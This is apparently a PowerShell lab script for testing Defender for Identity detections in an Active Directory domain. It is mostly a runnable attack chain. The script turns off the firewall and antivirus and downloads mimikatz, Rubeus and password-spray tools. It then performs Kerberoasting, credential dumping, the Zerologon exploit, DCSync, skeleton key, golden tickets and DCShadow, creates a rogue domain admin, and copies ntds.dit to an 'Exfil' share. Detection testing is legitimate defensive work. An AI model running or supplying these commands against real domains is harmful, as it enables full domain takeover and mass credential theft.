## Script created based on old https://learn.microsoft.com/pt-BR/defender-for-identity/playbooks page
## 
## !!! Still Under development !!!
##
## This script should not be executed in a production environment and it also requires some "pre-work" in order to work properly:
## - Victim-PC should have a help-desk admin credential exposed
## - Domain admin credential should be exposed in the admin-pc, to which help-desk admin should be administrator

## Update the URL for tooling as needed.
$tooling = @(
    "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/dotnet%20v4.5%20compiled%20binaries/Rubeus.exe",
    "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip",
    "https://raw.githubusercontent.com/InfosecMatter/Minimalistic-offensive-security-tools/master/adlogin.ps1",
    "https://raw.githubusercontent.com/jeanphorn/wordlist/master/usernames.txt",
    "https://live.sysinternals.com/psexec.exe",
    "https://github.com/ANSSI-FR/ORADAD/releases/download/3.2.196/ORADAD.zip"
)

## Adjust your variables
$domainController = "SRVDC01.davicruz.corp"
$adminWorkstation = "WKS01.davicruz.corp"
$domainName = "davicruz.corp"
$domainCN = "DC=davicruz,dc=corp"
$Honeytoken = "RaulR"

## Resolve IPs
# $domainControllerIP = [System.Net.Dns]::GetHostAddresses($domainController).IPAddressToString | Where-Object {$_ -notlike "*:*"}
$hostIP = [System.Net.Dns]::GetHostAddresses($env:COMPUTERNAME).IPAddressToString | Where-Object {$_ -notlike "*:*"}

## Creates Temp Directory and create a UNC Share to be used for exfiltration
$TempDir = "$PSScriptRoot\Temp"
New-Item -Path $TempDir -ItemType Directory
New-SmbShare -Name "Exfil" -Path $TempDir -FullAccess Everyone
Set-Location $TempDir

## Turn off firewall and antivirus
Get-NetFirewallProfile | Set-NetFirewallProfile -Enabled False
Add-MpPreference -ExclusionPath $TempDir
Set-ExecutionPolicy unrestricted

$mpPreferences = @{
    DisableBlockAtFirstSeen = $true
    DisableBehaviorMonitoring = $true
    DisableRealtimeMonitoring = $true
    DisableScriptScanning = $true
    EnableControlledFolderAccess = "Disabled"
    EnableNetworkProtection = "AuditMode"
    SubmitSamplesConsent = "NeverSend"
    PUAProtection = "Disabled"
    MAPSReporting = "Disabled"
}
Set-MpPreference  @mpPreferences -Force

## Download tools

# NetSess
Invoke-restmethod -Uri "https://www.joeware.net/downloads/dl2.php" `
    -method post -ContentType "application/x-www-form-urlencoded" `
    -Body "download=NetSess.zip&email=&B1=Download+Now" -outfile "NetSess.zip"

# Other Tools
foreach($item in $tooling){
    Invoke-RestMethod -Uri $item -Method Get -OutFile (Split-Path $item -Leaf)
}

# Unzip tools
foreach($item in Get-ChildItem *.zip){
    Expand-Archive -Path $item.fullname -DestinationPath $TempDir
}

### Starting Simulations

## Obtain Local admin credentails

## Remotely execute mimikatz with stolen credentials on remote machine

## Network-mapping reconnaissance (DNS) 
Write-Host -ForegroundColor Cyan "[ ] Network-mapping reconnaissance (DNS)"
cmd /c "(Echo server $domainController & Echo ls -d $domainName) | NSLOOKUP"
TIMEOUT /T 120

## User and IP Address reconnaissance (PUT YOUR DC NAME HERE)
Write-Host -ForegroundColor Cyan "[ ] User and IP Address reconnaissance (SMB)"
.\NetSess.exe $domainController
TIMEOUT /T 120

## User and group membership reconnaissance (SAMR)
Write-Host -ForegroundColor Cyan "[ ] User and group membership reconnaissance (SAMR)"
net user /domain 
net group /domain 
net group "Domain Admins" /domain 
net group "Enterprise Admins" /domain 
net group "Schema Admins" /domain 
TIMEOUT /T 120

## Security principal reconnaissance (LDAP)
Write-Host -ForegroundColor Cyan "[ ] Security principal reconnaissance (LDAP)"
.\ORADAD.exe
TIMEOUT /T 120

## Honeytoken activity
Write-Host -ForegroundColor Cyan "[ ] Honeytoken activity"
cmd /c "net use \\$domainController\netlogon /user:DC\$honeytoken P@ssw0rd!"
TIMEOUT /T 120

## Active Directory attributes reconnaissance (LDAP)
Write-Host -ForegroundColor Cyan "[ ] Active Directory attributes reconnaissance (LDAP)"
# Enumerate accounts with Kerberos DES enabled
([adsisearcher]'(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2097152))').FindAll() | Out-File -FilePath .\accounts.txt

# Enumerate accounts with Kerberos Pre-Authentication disabled
([adsisearcher]'(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))').FindAll() | Out-File -FilePath .\accounts.txt -Append

# Enumerate all enabled accounts
([adsisearcher]'(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))').FindAll() | Out-File -FilePath .\accounts.txt -Append

# Enumerate all servers configured for Unconstrained Delegation (Excluding DCs)
([adsisearcher]'(&(objectCategory=computer)(!(primaryGroupID=516)(userAccountControl:1.2.840.113556.1.4.803:=524288)))').FindAll() | Out-File -FilePath .\accounts.txt -Append

# Enumerate servers configured for Resource Based Constrained Delegation
Get-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS*" | Where-Object {$_.State -eq "NotPresent"} | Add-WindowsCapability -Online
repadmin /showattr * $domainCN
repadmin /showattr * $domainCN /subtree /filter:"((&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*)))" /attrs:cn,msDs-AllowedToActOnBehalfOfOtherIdentity

## Account enumerations Reconnaissance
Write-Host -ForegroundColor Cyan "[ ] Account enumerations Reconnaissance"
# Preparing dictionary
$list = Get-Content .\usernames.txt
$users = Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName
for($i=1;$i -le 40; $i++){
    # if multiple of 7, include a user from the existing directory
    if($i % 7 -eq 0){
        $users | Get-Random | Add-Content -Path "$TempDir\users.txt"
    }
    else{
        $list | Get-Random | Add-Content -Path "$TempDir\users.txt"
    } 
}

Import-Module .\adlogin.ps1
adlogin "$TempDir\users.txt" $domainName "P@ssw0rd!"
TIMEOUT /T 120

## Suspected AS-REP Roasting attack 
Write-Host -ForegroundColor Cyan "[ ] Suspected AS-REP Roasting attack"
.\Rubeus.exe kerberoast
TIMEOUT /T 3
.\Rubeus.exe kerberoast /tgtdeleg
TIMEOUT /T 3
.\Rubeus.exe asktgs "/service:http/$domainController" /ptt
TIMEOUT /T 3

## Suspected Brute-Force Attack (Kerberos, NTLM and LDAP) & Password Spray attack
Write-Host -ForegroundColor Cyan "[ ] Suspected Brute-Force Attack (Kerberos, NTLM and LDAP) & Password Spray attack"
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName | out-file -FilePath .\domainusers.txt
adlogin domainusers.txt $domainName "P@ssw0rd123456"
TIMEOUT /T 120

## Dump Credentials In-Memory
Write-Host -ForegroundColor Cyan "[ ] Dump Credentials In-Memory"
./x64/mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > "$env:Computername.txt"
TIMEOUT /T 120

## Malicious request of Data Protection API (DPAPI) master key 
Write-Host -ForegroundColor Cyan "[ ] Malicious request of Data Protection API (DPAPI) master key "
./x64/mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:$domainController /export"  "exit"
TIMEOUT /T 120

## Suspected skeleton key attack (encryption downgrade)
Write-Host -ForegroundColor Cyan "[ ] Suspected skeleton key attack (encryption downgrade)"
./x64/mimikatz.exe "privilege::debug" "misc::skeleton"  "exit"
TIMEOUT /T 120

## Suspected Netlogon privilege elevation attempt (CVE-2020-1472 exploitation)
Write-Host -ForegroundColor Cyan "[ ] Suspected Netlogon privilege elevation attempt (CVE-2020-1472 exploitation)"
./x64/mimikatz.exe "privilege::debug" "lsadump::zerologon /target:$domainController /account:$($domainController.Split('.')[0])$ /exploit"  "exit"
TIMEOUT /T 120

## Suspicious network connection over Encrypting File System Remote Protocol
Write-Host -ForegroundColor Cyan "[ ] Suspicious network connection over Encrypting File System Remote Protocol"
./x64/mimikatz.exe "privilege::debug" "misc::efs /server:$domainController /connect:$hostIP /noauth"  "exit"

## Suspicious additions to sensitive groups
Write-Host -ForegroundColor Cyan "[ ] Suspicious additions to sensitive groups"
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "net user /add BadGuy P@ssw0rd123" -ComputerName $domainController
Invoke-WmiMethod -Class Win32_Process -Name Create "net localgroup ""Domain Admins"" BadGuy /add" -ComputerName $domainController
TIMEOUT /T 120

## Admin SDholder Persistence
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName BadGuy -Verbose -Rights All
TIMEOUT /T 120

## Suspected DCSync attack (replication of directory services)
Write-Host -ForegroundColor Cyan "[ ] Suspected DCSync attack (replication of directory services)"
./x64/mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:$domainName /user:krbtgt" "exit" | Out-File krbtgt-export.txt
TIMEOUT /T 120

## Remote code execution attempts
Write-Host -ForegroundColor Cyan "[ ] Remote code execution attempts"
.\psexec.exe -accepteula -s -i \\$domainController whoami
TIMEOUT /T 120

## Data exfiltration over SMB
Write-host -ForegroundColor Cyan "[ ] Data exfiltration over SMB"
.\psexec.exe -accepteula -s -i \\$domainController "cmd /c mkdir c:\temp"
.\psexec.exe -accepteula -s -i \\$domainController "cmd /c Esentutl /y /i c:\windows\ntds\ntds.dit /d c:\temp\ntds.dit"
.\psexec.exe -accepteula -s -i \\$domainController "cmd /c copy c:\temp\ntds.dit \\$env:computername\Exfil\ntds.dit"

## Suspected Golden Ticket usage (encryption downgrade) & (nonexistent account) & (Time anomaly)
Write-Host -ForegroundColor Cyan "[ ] Suspected Golden Ticket usage (encryption downgrade) & (nonexistent account) & (Time anomaly)"
# Obtain krbtgt SID and hash for Golden ticket usage
$krbtgtSID = (Select-String "Security ID" ./krbtgt-export.txt).split(":")[1].trim()
$krbtgtHash = (Select-String "aes256_hmac" ./krbtgt-export.txt).split(":")[1].trim()
./x64/mimikatz.exe "privilege::debug" "Kerberos::golden /domain:$domainName /sid:$krbtgtSID /aes256:$krbtgtHash /user:administrator /id:500 /groups:513,512,520,518,519 /ticket:administrator.kirbi" `
    "kerberos::ptt administrator.kirbi" "misc::cmd" "klist" "exit"
TIMEOUT /T 30

./x64/mimikatz.exe "privilege::debug" "Kerberos::golden /domain:$domainName /sid:$krbtgtSID /aes256:$krbtgtHash /user:XYZ /id:500 /groups:513,512,520,518,519 /ticket:XYZ.kirbi" `
    "kerberos::ptt XYZ.kirbi" "misc::cmd" "klist" "exit"
TIMEOUT /T 120

## Suspected DCShadow attack (domain controller promotion) & (domain controller replication request)
Write-Host -ForegroundColor Cyan "[ ] Suspected DCShadow attack (domain controller promotion) & (domain controller replication request)"
./x64/mimikatz.exe "privilege::debug" "lsadump::dcshadow /object:krbtgt /attribute=ntPwdHistory /value:0000000000" "lsadump::dcshadow /push" "exit"
TIMEOUT /T 120